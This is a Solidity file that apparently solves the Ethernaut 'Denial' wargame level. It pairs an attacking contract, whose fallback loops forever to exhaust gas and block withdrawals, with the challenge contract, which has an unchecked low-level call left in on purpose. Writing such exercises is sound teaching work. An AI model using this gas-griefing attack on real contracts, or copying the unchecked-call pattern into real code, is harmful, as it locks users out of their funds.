// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title 20. STOP
 * @dev DoS the withdraw function.
 */

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract Ethernaut_Stop {
    IDenial idenial = IDenial(0xA5aCd27F60246ebdA0dF9E55Dd78f394715747c4);

    // 1. Let's start by becoming a partner...
    function becomePartner() public {
        idenial.setWithdrawPartner(address(this));
    }

    // 2. Then making sure that we use all the gas upon receiving the ETH.
    // This useless infinite loop will effectively DoS the withdraw function.
    fallback() external payable {
        while (true) {}
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    constructor() payable {}

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
